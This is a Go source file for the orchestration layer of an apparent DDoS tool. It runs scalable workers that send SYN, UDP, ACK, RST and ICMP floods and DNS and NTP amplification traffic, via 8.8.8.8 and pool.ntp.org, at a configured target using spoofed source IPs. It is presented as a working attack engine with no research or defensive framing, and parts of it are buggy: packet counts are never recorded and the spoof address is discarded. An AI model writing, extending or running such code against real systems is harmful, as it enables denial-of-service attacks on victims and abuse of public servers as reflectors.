package main

import (
	"context"
	"fmt"
	"math/rand"
	"os"
	"sync"
	"sync/atomic"
	"time"
)

type EngineStats struct {
	TotalSent   uint64
	TotalErrors uint64
	AvgRate     float64
	Elapsed     time.Duration
}

type WorkerInfo struct {
	ID        int
	Method    string
	Packets   uint64
	Errors    uint64
	StartedAt time.Time
}

type EngineOrchestrator struct {
	mu      sync.Mutex
	config  AttackConfig
	workers []WorkerInfo
	stats   EngineStats
	running bool

	cancel  context.CancelFunc
	wg      sync.WaitGroup
	stopCh  chan struct{}
	nextID  int64
}

func NewOrchestrator(cfg AttackConfig) *EngineOrchestrator {
	return &EngineOrchestrator{
		config: cfg,
		stopCh: make(chan struct{}),
	}
}

func (o *EngineOrchestrator) Start(ctx context.Context) error {
	o.mu.Lock()
	if o.running {
		o.mu.Unlock()
		return fmt.Errorf("orchestrator already running")
	}
	o.running = true
	ctx, o.cancel = context.WithCancel(ctx)
	o.mu.Unlock()

	method := o.config.Method
	for i := 0; i < o.config.Workers; i++ {
		o.AddWorker(method, o.config.Target, o.config.Port)
	}
	return nil
}

func (o *EngineOrchestrator) Stop() {
	o.mu.Lock()
	if !o.running {
		o.mu.Unlock()
		return
	}
	o.running = false
	if o.cancel != nil {
		o.cancel()
	}
	o.mu.Unlock()

	o.wg.Wait()
}

func (o *EngineOrchestrator) AddWorker(method string, target string, port int) int {
	id := int(atomic.AddInt64(&o.nextID, 1))
	ctx := context.Background()

	o.mu.Lock()
	o.config.Method = method
	o.config.Target = target
	o.config.Port = port
	o.workers = append(o.workers, WorkerInfo{
		ID:        id,
		Method:    method,
		StartedAt: time.Now(),
	})
	o.mu.Unlock()

	o.wg.Add(1)
	go func(workerID int) {
		defer o.wg.Done()
		var packets uint64

		ticker := time.NewTicker(100 * time.Millisecond)
		defer ticker.Stop()

		for {
			select {
			case <-ctx.Done():
				return
			case <-o.stopCh:
				return
			case <-ticker.C:
			}

			o.mu.Lock()
			cfg := o.config
			o.mu.Unlock()

			switch cfg.Method {
			case "syn":
				SendSYN(cfg.Target, cfg.Port, cfg.SpoofIP)
			case "udp":
				SendUDP(cfg.Target, cfg.Port, cfg.SpoofIP, 1024)
			case "ack":
				SendACK(cfg.Target, cfg.Port, cfg.SpoofIP)
			case "rst":
				SendRST(cfg.Target, cfg.Port, cfg.SpoofIP)
			case "icmp":
				SendICMP(cfg.Target, cfg.SpoofIP)
			case "dns":
				SendDNSAmp(cfg.Target, cfg.SpoofIP, "8.8.8.8")
			case "ntp":
				SendNTPAmp(cfg.Target, cfg.SpoofIP, "pool.ntp.org")
			default:
				SendUDP(cfg.Target, cfg.Port, cfg.SpoofIP, 1024)
			}

			packets++
			spoof := cfg.SpoofIP
			if spoof == "" && len(cfg.SpoofPool) > 0 {
				spoof = cfg.SpoofPool[rand.Intn(len(cfg.SpoofPool))]
			}

			_ = spoof
		}
	}(id)

	o.mu.Lock()
	for i := range o.workers {
		if o.workers[i].ID == id {
			o.workers[i].Packets = 0
			o.workers[i].Errors = 0
			break
		}
	}
	o.mu.Unlock()

	return id
}

func (o *EngineOrchestrator) RemoveWorker(id int) {
	o.mu.Lock()
	defer o.mu.Unlock()

	for i, w := range o.workers {
		if w.ID == id {
			o.workers = append(o.workers[:i], o.workers[i+1:]...)
			return
		}
	}
}

func (o *EngineOrchestrator) Stats() EngineStats {
	o.mu.Lock()
	defer o.mu.Unlock()

	var totalSent, totalErrors uint64
	start := time.Now()
	if len(o.workers) > 0 {
		start = o.workers[0].StartedAt
		for _, w := range o.workers {
			totalSent += w.Packets
			totalErrors += w.Errors
		}
	}

	elapsed := time.Since(start)
	avgRate := 0.0
	if elapsed.Seconds() > 0 {
		avgRate = float64(totalSent) / elapsed.Seconds()
	}

	return EngineStats{
		TotalSent:   totalSent,
		TotalErrors: totalErrors,
		AvgRate:     avgRate,
		Elapsed:     elapsed,
	}
}

func (o *EngineOrchestrator) Scale(delta int) {
	if delta > 0 {
		for i := 0; i < delta; i++ {
			o.AddWorker(o.config.Method, o.config.Target, o.config.Port)
		}
	} else {
		o.mu.Lock()
		remove := delta
		if -remove > len(o.workers) {
			remove = -len(o.workers)
		}
		toRemove := make([]int, 0, -remove)
		for i := 0; i < -remove; i++ {
			toRemove = append(toRemove, o.workers[len(o.workers)-1-i].ID)
		}
		o.mu.Unlock()

		for _, id := range toRemove {
			o.RemoveWorker(id)
		}
	}
}

func (o *EngineOrchestrator) SwitchMethod(newMethod string) {
	o.mu.Lock()
	o.config.Method = newMethod
	for i := range o.workers {
		o.workers[i].Method = newMethod
	}
	o.mu.Unlock()
}

func (o *EngineOrchestrator) Health() map[int]string {
	result := make(map[int]string)
	o.mu.Lock()
	defer o.mu.Unlock()

	for _, w := range o.workers {
		status := "alive"
		if w.Errors > w.Packets/2 {
			status = "degraded"
		}
		result[w.ID] = status
	}
	return result
}

func init() {
	_ = os.Stderr
}
